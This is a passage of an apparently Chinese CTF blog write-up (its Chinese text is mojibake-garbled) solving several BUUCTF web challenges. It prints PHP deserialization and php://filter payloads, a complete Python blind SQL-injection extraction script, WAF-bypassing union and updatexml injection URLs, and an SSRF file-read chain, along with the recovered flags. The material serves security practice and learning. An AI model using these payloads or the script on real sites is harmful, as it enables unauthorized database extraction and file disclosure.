<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b2c88b9c-f754<span class="number">-41</span>cb<span class="number">-8698</span><span class="number">-497647e43</span>bec&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åå…­ã€-ZJCTF-2019-NiZhuanSiWei"><a href="#åå…­ã€-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="åå…­ã€[ZJCTF 2019]NiZhuanSiWei"></a>åå…­ã€[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1ã€ä¸Šç½‘å­¦ä¹ äº†ä¸€ä¸‹ï¼Œ<strong>dataä¼ªåè®®</strong>çªç ´äº†ç¬¬ä¸€æ­¥è¿›å±•:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3fdf71bd-7ba8-45b7-9d2d-94a815756c7f.node3.buuoj.cn/?text=data:text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>2ã€ç¬¬äºŒæ­¥php://filter/convert.base64-encode/resourceè¯»ä¸€ä¸‹useless.phpæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>3ã€æ„é€ ä¸ªååºåˆ—åŒ–ï¼Œfileå±æ€§èµ‹å€¼ä¸ºflag.phpä½¿å…¶è§¦å‘__tostringæ–¹æ³•è¾“å‡ºflag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    Flagå·²ç»è¾“å‡ºï¼Œçœ‹çœ‹htmlæºç å§</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">608100</span>eb<span class="number">-7e97</span><span class="number">-40</span>c7-b85a<span class="number">-3006</span>b3658bbe&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åä¸ƒã€-CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#åä¸ƒã€-CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="åä¸ƒã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>åä¸ƒã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>è¸©äº†å¾ˆå¤šå‘</p>
<p>1ã€å¼‚æˆ–æ—¶ä¸¤è¾¹è¡¨è¾¾å¼ä¸ç”¨æ‹¬å·ï¼Œä¼˜å…ˆçº§ä¸åŒï¼ŒåŒºåˆ«å¾ˆå¤§ï¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usersè¡¨ä¸­group_concat(username)çš„ç»“æœç¬¬ä¸€ä¸ªæ˜¯&#39;D&#39;</span><br><span class="line">1^(substr((select group_concat(username) from users),1,1)&#x3D;&#39;A&#39;);    </span><br><span class="line">#ç»“æœ æ­£å¸¸1^0 &#x3D; 1</span><br><span class="line">1^substr((select group_concat(username) from users),1,1)&#x3D;&#39;A&#39;;</span><br><span class="line">#ç»“æœ 1^1&#x3D;0ï¼Œæ²¡æœ‰åŠ æ‹¬å·ï¼ç›¸å½“äº1^&#39;D&#39;&#x3D;&#39;A&#39;!</span><br></pre></td></tr></table></figure>

<p>2ã€æœ‰WAFçš„æ—¶å€™è¦æ³¨æ„è‡ªå·±è„šæœ¬ä¸­çš„Payloadæ˜¯å¦å­˜åœ¨WAFæ‹¦æˆªçš„å­—ç¬¦ï¼ï¼</p>
<p>3ã€ç›®æ ‡ç½‘ç«™å¯èƒ½æœ‰WAFï¼Œè¦å¤„ç†WAFæ‹¦æˆªçš„æƒ…å†µã€‚</p>
<p>4ã€è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ascii_low = <span class="number">32</span>  <span class="comment">#çˆ†ç ´çš„asciiå­—ç¬¦ä¸‹é™</span></span><br><span class="line">ascii_up = <span class="number">127</span>  <span class="comment">#çˆ†ç ´çš„asciiå­—ç¬¦ä¸Šé™</span></span><br><span class="line">keyword=<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">tb_choose=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">cn_name=[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">IFS=<span class="string">&#x27;\x0a&#x27;</span></span><br><span class="line">payload = [<span class="string">&quot;1^if(&quot;</span>, <span class="string">&quot;,0,1)&quot;</span>] <span class="comment">#æ‹†åˆ†å‡ºattack payloadæ’å…¥ç‚¹</span></span><br><span class="line">param = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;<span class="comment">#çˆ†ç ´ç‚¹å‚æ•°å€¼ä¸å¡«ï¼Œå¦‚æœæœ‰å…¶å®ƒå‚æ•°ï¼ŒåŠ å…¥å³å¯</span></span><br><span class="line">key = <span class="string">&quot;id&quot;</span>   <span class="comment">#çˆ†ç ´æ³¨å…¥çš„å‚æ•°</span></span><br><span class="line">url = <span class="string">&quot;http://d2e9e3db-f037-4f2d-849a-20328ecb52ad.node3.buuoj.cn/index.php&quot;</span>  <span class="comment">#æ³¨å…¥URL</span></span><br><span class="line">flag = <span class="number">1</span>    <span class="comment"># 0 Get / 1 Post</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*]çˆ†ç ´è¡¨<span class="subst">&#123;tb_choose&#125;</span>ä¸­çš„è®°å½•æ¡æ•°......&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respon_require</span>():</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        respon = requests.get(url, params=param)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">        respon = requests.post(url, data=param)</span><br><span class="line">    <span class="keyword">return</span> respon</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;(select<span class="subst">&#123;IFS&#125;</span>count(<span class="subst">&#123;cn_name[<span class="number">0</span>]&#125;</span>)<span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>)=<span class="subst">&#123;i&#125;</span>&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">        dt_count = i </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+]æ•°æ®è¡¨<span class="subst">&#123;tb_choose&#125;</span>ä¸­è®°å½•æ¡æ•°ï¼š<span class="subst">&#123;dt_count&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(cn_name)</span><br><span class="line">    cn_choose = input(<span class="string">&#x27;è¾“å…¥è¦çˆ†ç ´çš„å­—æ®µæ•°æ®:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cn_choose.lower() <span class="keyword">not</span> <span class="keyword">in</span> [tmp.lower() <span class="keyword">for</span> tmp <span class="keyword">in</span> cn_name]:</span><br><span class="line">        print(<span class="string">&#x27;[-]Error&#x27;</span>) </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, dt_count):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="comment">#param[key] = payload[0] + f&quot;(select&#123;IFS&#125;length(&#123;cn_choose&#125;)&#123;IFS&#125;from&#123;IFS&#125;&#123;tb_choose&#125;&#123;IFS&#125;LIMIT&#123;IFS&#125;&#123;i&#125;,1)=&#123;j&#125;&quot; + payload[1]</span></span><br><span class="line">            param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;(select<span class="subst">&#123;IFS&#125;</span>length(<span class="subst">&#123;cn_choose&#125;</span>)<span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>)=<span class="subst">&#123;j&#125;</span>&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                    dt_len = j</span><br><span class="line">                    tmp_data = <span class="string">&quot;&quot;</span></span><br><span class="line">                    real_res = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">while</span> real_res &lt; dt_len:</span><br><span class="line">                        left = ascii_low</span><br><span class="line">                        right = ascii_up</span><br><span class="line">                        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                mid = (left + right) // <span class="number">2</span></span><br><span class="line">                                param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;ascii(substr((select<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;cn_choose&#125;</span><span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>),<span class="subst">&#123;real_res+<span class="number">1</span>&#125;</span>,1))=ascii(char(<span class="subst">&#123;mid&#125;</span>))&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">                                <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                                    tmp_data += chr(mid)</span><br><span class="line">                                    real_res += <span class="number">1</span> </span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                param[key] = payload[<span class="number">0</span>] + <span class="string">f&quot;ascii(substr((select<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;cn_choose&#125;</span><span class="subst">&#123;IFS&#125;</span>from<span class="subst">&#123;IFS&#125;</span><span class="subst">&#123;tb_choose&#125;</span>),<span class="subst">&#123;real_res+<span class="number">1</span>&#125;</span>,1))&lt;ascii(char(<span class="subst">&#123;mid&#125;</span>))&quot;</span> + payload[<span class="number">1</span>]</span><br><span class="line">                                <span class="keyword">if</span> respon_require().text.find(keyword) != <span class="number">-1</span>:</span><br><span class="line">                                    right = mid - <span class="number">1</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    left = mid + <span class="number">1</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                print(e)</span><br><span class="line">                                <span class="keyword">pass</span></span><br><span class="line">                    print(<span class="string">f&#x27;[<span class="subst">&#123;cn_choose&#125;</span>]ï¼š<span class="subst">&#123;tmp_data&#125;</span>, [length]: <span class="subst">&#123;dt_len&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>5ã€Flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">7</span>c4e5fbb<span class="number">-1e20</span><span class="number">-415</span>b<span class="number">-9</span>fad-af978c8224cb&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åå…«ã€-ç½‘é¼æ¯-2018-Fakebook"><a href="#åå…«ã€-ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="åå…«ã€[ç½‘é¼æ¯ 2018]Fakebook"></a>åå…«ã€[ç½‘é¼æ¯ 2018]Fakebook</h3><p>SSRF+SQL+PHPååºåˆ—åŒ–ç»„åˆæ‹³</p>
<p>1ã€ä¿¡æ¯æ”¶é›†ï¼Œrobots.txtä¸­å‘ç°æœ‰æºç user.php.bakã€‚</p>
<p>â€‹    ç®€å•å®¡è®¡æºç åˆæ­¥è®¤å®šæ˜¯SSRFæ¼æ´åˆ©ç”¨è·å¾—flagï¼Œç›²çŒœç½‘é¡µç›®å½•ä¸‹çš„flag.phpï¼Œå‘ç°å­˜åœ¨ã€‚æ ¹æ®ä¸‹é¢çš„ä»£ç ï¼Œæ­£åˆ™ä¸¥æ ¼è¦æ±‚httpåè®®æ‰èƒ½é€šè¿‡ï¼Œæ— æ³•æ„é€ fileåè®®ã€‚å°è¯•åŠå¤©æ— æœï¼ŒæŸ¥è¯¢WPå‘ç°æŸ¥è¯¢blogçš„å‚æ•°é¡µå­˜åœ¨SQLæ³¨å…¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€?no=Xå‚æ•°çš„SQLæ³¨å…¥ï¼Œä¸”WAFè¿‡æ»¤selectï¼Œè¡Œå†…æ³¨é‡Šè¿‡æ»¤</p>
<p>â€‹    ç»è¿‡å‚æ•°ä¼ é€’æµ‹è¯•ï¼Œå‘ç°æ˜¯æ•°å­—å‹æ³¨å…¥ä¸”å¯è”åˆæŸ¥è¯¢æ„é€ å›æ˜¾ï¼Œæµ‹è¯•ä¸­å‘ç°åå°è¿‡æ»¤äº†selectï¼Œè¡Œå†…æ³¨é‡Šè¿‡æ»¤å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=<span class="number">15</span>%<span class="number">20</span>union%<span class="number">20</span><span class="comment">/*!selecT*/</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>3ã€å‘ç°å­˜åœ¨ååºåˆ—åŒ–å‡½æ•°æŠ¥é”™ï¼Œå› æ­¤çŒœæµ‹ï¼Œå­—æ®µ1ã€2ã€3ã€4åˆ†åˆ«æ˜¯usernameã€ageã€blogåœ°å€ã€åºåˆ—åŒ–æ•°æ®ï¼Œåç«¯éœ€è¦æ¯æ¬¡æ ¹æ®noå‚æ•°æŸ¥è¯¢å‡º4å­—æ®µçš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œå› æ­¤ä¸‹é¢æ„é€ UserInfoåºåˆ—åŒ–æ•°æ®å¡«å……blogåœ°å€ï¼Œå³å¯ç»•è¿‡SSRFè¯·æ±‚ä½¿ç”¨fileåè®®è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /view.php?no=<span class="number">15</span>%<span class="number">20</span>union%<span class="number">20</span><span class="comment">/*!selecT*/</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,%<span class="number">27</span>%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">38</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">55</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">66</span>%<span class="number">6</span>f%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">63</span>%<span class="number">6</span>b%<span class="number">65</span>%<span class="number">72</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">61</span>%<span class="number">67</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">38</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">62</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">67</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">39</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">2</span>f%<span class="number">77</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">2</span>f%<span class="number">68</span>%<span class="number">74</span>%<span class="number">6</span>d%<span class="number">6</span>c%<span class="number">2</span>f%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>4ã€è¯»åˆ°flag.phpï¼Œbase64è§£ç ï¼Œæˆ–è€…ç›´æ¥æµè§ˆå™¨ä¸­æ‰“å¼€æŸ¥çœ‹æºç å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">77</span>f97643-dcd1<span class="number">-4206</span><span class="number">-801</span>d<span class="number">-2919297</span>b55ca&#125;</span><br></pre></td></tr></table></figure>

<p>ç»†å¿ƒæ‰æ˜¯ç‹é“å•Šï¼ä»»ä½•å‚æ•°ç‚¹éƒ½ä¸èƒ½æ”¾è¿‡ï¼</p>
<h3 id="åä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#åä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="åä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>åä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/D9Pr7t"><img src="https://s3.ax1x.com/2020/11/13/D9Pr7t.png" alt="D9Pr7t.png"></a></p>
<p>è€æœ‹å‹äº†ï¼Œå°±è¿™ï¼Ÿ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span> </span><br></pre></td></tr></table></figure>

<p>å•Šï¼è¿‡æ»¤ç©ºæ ¼ã€andã€&amp;ã€|ã€è¿˜æœ‰substrç­‰</p>
<p>è¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨æ‹¬å·å‰é¢å­¦åˆ°äº†ï¼Œä½†æ˜¯è¿‡æ»¤ç­‰å·è¿™é‡Œè’™Bäº†ï¼Œå˜»å˜»ç”¨likeã€rlikeéƒ½å¯ä»¥ï¼Œå­¦åˆ°å•¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(group_concat(table_name),500))from(information_schema.columns)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line">    </span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~H4rDsq1~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨å‡ºåˆ—å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(group_concat(column_name),500))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~id,username,password~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>leftã€rightå·¦å³çˆ†å‡ºå³å¯ï¼</p>
